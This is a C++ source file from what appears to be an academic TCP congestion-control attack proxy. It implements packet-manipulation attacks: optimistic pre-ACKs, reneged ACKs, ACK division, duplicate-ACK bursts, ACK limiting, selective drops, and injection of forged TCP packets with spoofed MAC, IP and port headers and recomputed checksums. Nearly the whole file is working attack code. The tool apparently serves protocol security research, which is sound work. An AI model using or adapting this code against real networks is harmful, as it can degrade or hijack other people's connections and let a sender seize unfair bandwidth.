/******************************************************************************
 * Author: Samuel Jero <sjero@purdue.edu>
 * TCP Congestion Control Proxy: TCP specific attack code
 *****************************************************************************/
#include "proxy.h"
#include "tcp.h"
#include "checksums.h"
#include "attacker.h"
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
using namespace std;

/* Handle Sequence Wrap */
static int seq_before(uint32_t s1, uint32_t s2)
{
	return (int32_t)(s2 - s1) > 0;
}

static int seq_diff(uint32_t s1, uint32_t s2)
{
	return (s1 > s2) ? s1 - s2: (0xFFFFFFFF - s2 + s1);
}

#define SEQ_BEFORE(s1, s2) (s1 != s2 && seq_before(s1,s2))
#define SEQ_AFTER(s1, s2) (s1 != s2 && !seq_before(s1,s2))
#define SEQ_BEFOREQ(s1, s2) (s1 == s2 || seq_before(s1,s2))
#define SEQ_AFTERQ(s1, s2) (s1 == s2 || !seq_before(s1,s2))

bool TCPModifier::in_pkt_range(unsigned long pkt)
{
	if (pkt >= start && stop == 0) {
		return true;
	}
	return pkt >= start && pkt < stop;
}

bool TCPModifier::is_state(int active_state)
{
	return state == active_state || state == TCP_STATE_ANY;
}

pkt_info TCPModifier::drop(pkt_info pk) {
	if (pk.valid && pk.msg.buff != NULL) {
		free(pk.msg.buff);
	}
	memset(&pk,0,sizeof(pkt_info));
	pk.valid = false;
	pk.msg.buff = NULL;
	return pk;
}

TCPPreAck::TCPPreAck(unsigned long start, unsigned long stop, int state, int preack_amt, int preack_method)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	this->preack_amt = preack_amt;
	this->preack_method = preack_method;
}

bool TCPPreAck::shouldApply(unsigned long pktnum, int state)
{
	return in_pkt_range(pktnum) && is_state(state);
}

pkt_info TCPPreAck::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	struct tcphdr *tcph;
	uint32_t ack;

	if (old_src.port) {} /* Prevent unused warning */

	tcph = (struct tcphdr*)hdr.buff;

	ack = ntohl(tcph->th_ack);
	if (preack_method == 0) {
		/* Constant positive offset */
		if (SEQ_AFTER((uint32_t)ack + preack_amt, dst.high_seq)) {
			tcph->th_ack = htonl(dst.high_seq + 1);
		} else {
			tcph->th_ack = htonl(ack+preack_amt);
		}
	} else if (preack_method == 1) {
		/* Keep Acking */
		if (!src.preack_save) {
			src.preack_save = ack;
		}
		if (SEQ_AFTER((uint32_t)src.preack_save + preack_amt, dst.high_seq)) {
			src.preack_save = dst.high_seq + 1;
			tcph->th_ack = htonl(src.preack_save);
		} else {
			src.preack_save = src.preack_save + preack_amt;
			tcph->th_ack = htonl(src.preack_save);
		}
	} else if (preack_method == 2) {
		/* Always Ack highest possible value, but avoid dup acks */
		if (dst.have_initial_seq) {
			if (ack == dst.high_seq + 1 || src.preack_save == 0) {
				src.preack_save = dst.high_seq + 1;
				tcph->th_ack = htonl(dst.high_seq+1);
			} else if (SEQ_AFTER((uint32_t)dst.high_seq - 100, src.preack_save)) {
				src.preack_save = dst.high_seq - 100;
				tcph->th_ack = htonl(dst.high_seq - 100);
			} else if (SEQ_AFTER((uint32_t)src.preack_save, dst.high_seq)) {
				src.preack_save = dst.high_seq + 1;
				tcph->th_ack = htonl(src.preack_save);
			} else {
				src.preack_save += 1;
				tcph->th_ack = htonl(src.preack_save);
			}
		}
	} else if (preack_method == 3) {
		if (dst.have_initial_seq) {
			tcph->th_ack = htonl(dst.high_seq + 1);

			if (dst.high_seq == src.preack_save) {
				return drop(pk);
			}
			src.preack_save = dst.high_seq;
		}
	} else if (preack_method == 4) {
		/* Always Ack highest possible value */
		if (dst.have_initial_seq) {
			tcph->th_ack = htonl(dst.high_seq + 1);
		}
	}

	/* Update high ACK */
	src.high_ack = ntohl(tcph->th_ack);

	/* Update checksum */
	tcph->th_sum = 0;
	tcph->th_sum = ipv4_pseudohdr_chksum((u_char*)hdr.buff,hdr.len,(u_char*)pk.ip_dst,(u_char*)pk.ip_src,6);

	//dbgprintf(2,"PreAck: %u -> %u\n", ack, ack + preack_amt);
	return pk;
}

TCPRenege::TCPRenege(unsigned long start, unsigned long stop, int state, int renege_amt, int renege_growth)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	this->renege_amt = renege_amt;
	this->renege_growth = renege_growth;
}

bool TCPRenege::shouldApply(unsigned long pktnum, int state)
{
	return in_pkt_range(pktnum) && is_state(state);
}

pkt_info TCPRenege::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	struct tcphdr *tcph;
	uint32_t ack;

	if (dst.port) {} /* Prevent unused warning */
	if (old_src.port) {} /* Prevent unused warning */

	tcph = (struct tcphdr*)hdr.buff;
	
	ack = ntohl(tcph->th_ack);
	if (renege_growth == 1) {
		/* Keep reneging */
		if (!src.renege_save) {
			src.renege_save = ack - renege_amt;
			tcph->th_ack = htonl(src.renege_save);
		} else {
			src.renege_save = src.renege_save - renege_amt;
			tcph->th_ack = htonl(src.renege_save);
		}
		//dbgprintf(2, "Renege: %u\n", renege_save);
	} else {
		/* Constant negative offset */
		tcph->th_ack = htonl(ack-renege_amt);
		//dbgprintf(2, "Renege: %u -> %u\n", ack, ack - renege_amt);
	}

	/* Update Checksum */
	tcph->th_sum = 0;
	tcph->th_sum = ipv4_pseudohdr_chksum((u_char*)hdr.buff,hdr.len,(u_char*)pk.ip_dst,(u_char*)pk.ip_src,6);

	return pk;
}

TCPDiv::TCPDiv(unsigned long start, unsigned long stop, int state, int div_bpc)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	this->div_bpc = div_bpc;
}

bool TCPDiv::shouldApply(unsigned long pktnum, int state)
{
	return in_pkt_range(pktnum) && is_state(state);
}

pkt_info TCPDiv::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	struct tcphdr *tcph;
	uint32_t ack;
	int diff;
	int bpc;

	if (src.port) {} /* Prevent unused warning */
	if (dst.port) {} /* Prevent unused warning */

	tcph = (struct tcphdr*)hdr.buff;
	ack = ntohl(tcph->th_ack);

	/* Only divide new acks */
	if (SEQ_BEFOREQ(ack,old_src.high_ack)) {
		return pk;
	}

	if (!old_src.have_initial_ack) {
		/* old_src is uninitialized! (First ACK) */
		return pk;
	}

	/* Sequence range to divide */
	diff = seq_diff(ack,old_src.high_ack);

	if (diff > 2000000) {
		dbgprintf(0, "Warning: Impossibly Huge ACKed range! Not generating DIV acks\n");
		return pk;
	}

	/* Do division */
	ack = old_src.high_ack;
	while(diff > 0) {
		/* chunks must be smaller than remaining sequence space to ack */
		if (diff > div_bpc) {
			bpc = div_bpc;
		} else {
			bpc = diff;
		}

		/* do increment */
		ack += bpc;
		diff -= bpc;

		/* Set ACK */
		tcph->th_ack = htonl(ack);

		/* Send */
		//dbgprintf(2, "Sending DIV ack: %u\n", ack);
		Attacker::get().fixupAndSend(pk,hdr,true);
	}

	/* Cleanup */
	free(pk.msg.buff);
	pk.msg.buff = NULL;
	pk.msg.len = 0;
	pk.valid = false;
	pk.ip_src = pk.ip_dst = NULL;
	pk.mac_src = pk.mac_dst = NULL;

	return pk;
}


TCPDup::TCPDup(unsigned long start, unsigned long stop, int state, int dup_num)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	this->dup_num = dup_num;
}

bool TCPDup::shouldApply(unsigned long pktnum, int state)
{
	return in_pkt_range(pktnum) && is_state(state);
}

pkt_info TCPDup::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	if (src.port) {} /* Prevent unused warning */
	if (old_src.port) {} /* Prevent unused warning */
	if (dst.port) {} /* Prevent unused warning */

	for(int i = 0; i < dup_num + 1; i++) {
		/* Send */
		//dbgprintf(2, "Sending DUP ack\n");
		Attacker::get().fixupAndSend(pk,hdr,true);
	}

	/* Cleanup */
	free(pk.msg.buff);
	pk.msg.buff = NULL;
	pk.msg.len = 0;
	pk.valid = false;
	pk.ip_src = pk.ip_dst = NULL;
	pk.mac_src = pk.mac_dst = NULL;

	return pk;
}

TCPBurst::TCPBurst(unsigned long start, unsigned long stop, int state, int burst_num)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	this->burst_num = burst_num;
	pthread_mutex_init(&burst_mutex, NULL);
}

TCPBurst::~TCPBurst()
{
	pthread_mutex_destroy(&burst_mutex);
}

bool TCPBurst::shouldApply(unsigned long pktnum, int state)
{
	bool res = in_pkt_range(pktnum) && is_state(state);
	if (!res) {
		FinishBurst();
	}
	return res;
}

pkt_info TCPBurst::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	if (src.port) {} /* Prevent unused warning */
	if (old_src.port) {} /* Prevent unused warning */
	if (dst.port) {} /* Prevent unused warning */

	pthread_mutex_lock(&burst_mutex);
	burst_pkts.push_back(make_pair(pk,hdr));

	if ((int)burst_pkts.size() >= burst_num) {
		for (list<pair<pkt_info,Message> >::iterator it = burst_pkts.begin(); it != burst_pkts.end(); it++) {
			/* Send */
			//dbgprintf(2, "Sending BURST packets!\n");
			Attacker::get().fixupAndSend(it->first, it->second, true);

			/* Cleanup */
			free(it->first.msg.buff);
			it->first.msg.buff = NULL;
		}

		burst_pkts.clear();
	}
	pthread_mutex_unlock(&burst_mutex);

	/* Release packet */
	pk.msg.buff = NULL;
	pk.msg.len = 0;
	pk.valid = false;
	pk.ip_src = pk.ip_dst = NULL;

	return pk;
}


void TCPBurst::FinishBurst()
{
	pthread_mutex_lock(&burst_mutex);
	if (burst_pkts.size() > 0) {
			for (list<pair<pkt_info,Message> >::iterator it = burst_pkts.begin(); it != burst_pkts.end(); it++) {
				/* Send */
				//dbgprintf(2, "Sending BURST packets!\n");
				Attacker::get().fixupAndSend(it->first, it->second, true);

				/* Cleanup */
				free(it->first.msg.buff);
				it->first.msg.buff = NULL;
			}
			burst_pkts.clear();
	}	
	pthread_mutex_unlock(&burst_mutex);

	return;
}

TCPLimitAck::TCPLimitAck(unsigned long start, unsigned long stop, int state)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	this->active = false;
}

bool TCPLimitAck::shouldApply(unsigned long pktnum, int state)
{
	bool ret = in_pkt_range(pktnum) && is_state(state);
	if (!ret) {
		this->active = false;
	}
	return ret;
}

pkt_info TCPLimitAck::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	struct tcphdr *tcph;

	if (dst.port) {} /* Prevent unused warning */
	if (old_src.port) {} /* Prevent unused warning */

	if (!active) {
		/* If just becoming active, save high ACK */
		active = true;
		src.limit_save = src.high_ack;
	}

	/* Set ACK */
	tcph = (struct tcphdr*)hdr.buff;
	tcph->th_ack = htonl(src.limit_save);

	/* Update Checksum */
	tcph->th_sum = 0;
	tcph->th_sum = ipv4_pseudohdr_chksum((u_char*)hdr.buff,hdr.len,(u_char*)pk.ip_dst,(u_char*)pk.ip_src,6);
	return pk;
}

TCPDrop::TCPDrop(unsigned long start, unsigned long stop, int state, int p)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	this->p = p;
	this->rdata = 0;
}

bool TCPDrop::shouldApply(unsigned long pktnum, int state)
{
	return in_pkt_range(pktnum) && is_state(state);
}

pkt_info TCPDrop::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	if (dst.port) {} /* Prevent unused warning */
	if (old_src.port) {} /* Prevent unused warning */
	if (src.port) {} /* Prevent unused warning */
	if (hdr.buff) {} /* Prevent unused warning */

	if (rand_r(&rdata) % 100 <= p) {
		pk = drop(pk);
	}
	return pk;
}


TCPInject::TCPInject(unsigned long start, unsigned long stop, int state, inject_info &info)
{
	this->start = start;
	this->stop = stop;
	this->state = state;
	memcpy(&this->info, &info, sizeof(inject_info));
	info.start = start;
	info.stop = stop;
	info.state = state;
	this->fwd = NULL;
	this->rev = NULL;
	this->running = false;
	this->thread_running = false;
	pthread_mutex_init(&this->timeout_mutex, NULL);
	if (start == 0) {
		Start();
	}
}

TCPInject::~TCPInject()
{
	pthread_mutex_destroy(&this->timeout_mutex);
}

bool TCPInject::shouldApply(unsigned long pktnum, int state)
{
	bool ret = in_pkt_range(pktnum) && is_state(state);
	if (!ret && this->running) {
		Stop();
	}
	return ret;
}

pkt_info TCPInject::apply(pkt_info pk, Message hdr, tcp_half &src, tcp_half &old_src, tcp_half &dst)
{
	if (hdr.buff) {} /* Prevent unused warning */
	if (old_src.port) {} /* Prevent unused warning */

	if (pk.dir == FORWARD) {
		fwd = &src;
		rev = &dst;
	} else {
		fwd = &dst;
		rev = &src;
	}

	if (!this->running) {
		Start();
	}

	return pk;
}

bool TCPInject::Start()
{
	dbgprintf(1, "Start Injection\n");

	/* Start thread */
	running = true;
	if (pthread_create(&thread, NULL, thread_run, this)<0) {
		dbgprintf(0, "Error: Failed to start inject thread: %s\n", strerror(errno));
		running = false;
		return false;
	}
	thread_running = true;
	return true;
}

/* stupid pthreads/C++ glue */
void* TCPInject::thread_run(void* arg)
{
	TCPInject *t = (TCPInject*)arg;
	t->_run();
	t->thread_running = false;
	return NULL;
}

void TCPInject::_run()
{
	struct timespec time;
	struct timeval tm;
	int sec;
	int nsec;
	int pkts = 0;

	/* Mutex used only to sleep on */
	pthread_mutex_lock(&timeout_mutex);

	
	while(running) {
		if (!BuildPacket(pk,msg,info)) {
			dbgprintf(0, "Error: Failed to build packet!\n");
			return;
		}

		pk = Attacker::get().fixupAndSend(pk,msg,true);
		pkts++;

		/* Exit after having sent enough packets */
		if(info.num > 0 && info.num >= pkts) {
			break;
		}

		/* Compute time to send */
		sec = info.freq / 1000;
		nsec = (info.freq % 1000)*1000000;
		gettimeofday(&tm, NULL);
		time.tv_sec = 0;
		time.tv_nsec = tm.tv_usec*1000 + nsec;
		if (time.tv_nsec > 1000000000) {
			time.tv_sec += time.tv_nsec/1000000000;
			time.tv_nsec = time.tv_nsec%1000000000;
		}
		time.tv_sec += (tm.tv_sec + sec);

		/* Sleep */
		pthread_mutex_timedlock(&timeout_mutex, &time);
	}

	free(pk.msg.buff);
	pk.msg.buff = NULL;
	pk.valid = false;
}

bool TCPInject::Stop() {
	if (!running) {
		return true;
	}

	running = false;
	/* Unlocking an unlocked mutex is undefined.
	 * 	 * Do this instead. */
	if (pthread_mutex_trylock(&timeout_mutex)) {
		pthread_mutex_unlock(&timeout_mutex);
	} else {
		pthread_mutex_unlock(&timeout_mutex);
	}

	return true;
}

bool TCPInject::BuildPacket(pkt_info &pk, Message &hdr, inject_info &info)
{
	char src_mac[6];
	char dst_mac[6];
	uint32_t src_ip;
	uint32_t dst_ip;
	uint16_t src_port;
	uint16_t dst_port;
	Message next;

	/* Validate Addresses */
	if (fwd && rev && fwd->ip != 0 && fwd->port != 0 && rev->ip != 0 && rev->port != 0) {
		/* Already received pkts, can grab addresses */
		if (info.dir == FORWARD) {
			memcpy(src_mac,rev->mac,6);
			memcpy(dst_mac,fwd->mac,6);
			src_ip = rev->ip;
			dst_ip = fwd->ip;
			src_port = rev->port;
			dst_port = fwd->port;
		} else if (info.dir == BACKWARD) {
			memcpy(src_mac,fwd->mac,6);
			memcpy(dst_mac,rev->mac,6);
			src_ip = fwd->ip;
			dst_ip = rev->ip;
			src_port = fwd->port;
			dst_port = rev->port;
		} else {
			dbgprintf(0, "Error: Invalid direction\n");
			return false;
		}
	} else {
		/* Need addresses from command */
		if (!info.mac_src || !info.mac_dst || !info.ip_src ||
			!info.ip_dst || !info.port_src || !info.port_dst) {
			dbgprintf(0, "Error: Missing required injection addresses!\n");
			return false;
		}
		if (info.dir != FORWARD && info.dir != BACKWARD) {
			dbgprintf(0, "Error: Invalid injection direction!\n");
			return false;
		}
		if (!Attacker::get().normalize_mac(info.mac_src,src_mac) ||
			!Attacker::get().normalize_mac(info.mac_dst,dst_mac)) {
			dbgprintf(0, "Error: Invalid MAC addresses!\n");
			return false;
		}
		src_ip = Attacker::get().normalize_addr(info.ip_src);
		dst_ip = Attacker::get().normalize_addr(info.ip_dst);
		if (!src_ip || !dst_ip) {
			dbgprintf(0, "Error: Invalid IP addresses!\n");
			return false;
		}
		src_port = info.port_src;
		dst_port = info.port_dst;
	}

	/* Allocate buffer*/
	pk.msg.alloc = 1500;
	pk.msg.len = pk.msg.alloc;
	pk.msg.buff = (char*)malloc(pk.msg.alloc);
	if (!pk.msg.buff) {
		return false;
	}

	/* Initialize packet_info */
	pk.valid = true;
	pk.ip_type = 0;
	pk.ip_src = pk.ip_dst = NULL;
	pk.mac_src = pk.mac_dst = NULL;
	pk.rcv = NULL;
	pk.dir = info.dir;
	if (info.dir == FORWARD) {
		pk.snd = GetForwardInterface();
	} else {
		pk.snd = GetBackwardInterface();
	}

	/* Create headers */
	next = BuildEthHeader(pk.msg, src_mac, dst_mac, ETHERTYPE_IP);
	next = BuildIPHeader(next, src_ip, dst_ip, 6);
	next = BuildTCPHeader(next, src_port, dst_port, info, hdr, src_ip, dst_ip);

	/* Fixup checksums, etc */
	pk = Attacker::get().fixupAndSend(pk,hdr,false);

	return true;
}

Message TCPInject::BuildEthHeader(Message pk, char* src, char* dst, int next)
{
	struct ether_header *eth;

	eth = (struct ether_header*)pk.buff;
	memcpy(eth->ether_dhost,dst,6);
	memcpy(eth->ether_shost,src,6);
	eth->ether_type = htons(next);

	pk.buff += sizeof(struct ether_header);
	pk.len -= sizeof(struct ether_header);
	return pk;
}

Message TCPInject::BuildIPHeader(Message pk, uint32_t src, uint32_t dst, int next)
{
	struct iphdr *ip;

	ip = (struct iphdr*)pk.buff;
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons(pk.len);
	ip->id = 0;
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = next;
	ip->check = 0;
	ip->saddr = src;
	ip->daddr = dst;

	pk.buff += sizeof(struct iphdr);
	pk.len -= sizeof(struct iphdr);

	return pk;
}

Message TCPInject::BuildTCPHeader(Message pk, uint16_t src, uint16_t dst, inject_info &info, Message &ip_payload, uint32_t ipsrc, uint32_t ipdst)
{
	struct tcphdr *tcph;
	tcp_half *tsrc;

	tcph = (struct tcphdr*)pk.buff;
	tcph->th_sport = htons(src);
	tcph->th_dport = htons(dst);
	tcph->th_x2 = 0;
	tcph->th_off = 5;
	tcph->th_flags = info.type;
	tcph->th_sum = 0;
	tcph->th_urp = 0;

	switch(info.method) {
		case METHOD_ID_ABS:
			tcph->th_seq = htonl(info.seq);
			tcph->th_ack = htonl(info.ack);
			tcph->th_win = htons(info.window);
			break;
		case METHOD_ID_REL:
			if (info.dir == FORWARD) {
				tsrc = rev;
			} else {
				tsrc = fwd;
			}
			if (!tsrc) {
				dbgprintf(0, "Error: REL injection with NULL src!\n");
				return pk;
			}
			tcph->th_seq = htonl(tsrc->high_seq + info.seq);
			tcph->th_ack = htonl(tsrc->high_ack + info.ack);
			tcph->th_win = htons(tsrc->window + info.window);
			break;
		default:
			dbgprintf(0, "Error: Invalid Injection method!\n");
			return pk;
	}

	tcph->th_sum = ipv4_pseudohdr_chksum((u_char*)pk.buff,sizeof(struct tcphdr),(u_char*)&ipdst,(u_char*)&ipsrc,6);

	ip_payload = pk;
	ip_payload.len = sizeof(struct tcphdr);

	pk.buff += sizeof(struct tcphdr);
	pk.len -= sizeof(struct tcphdr);

	return pk;
}
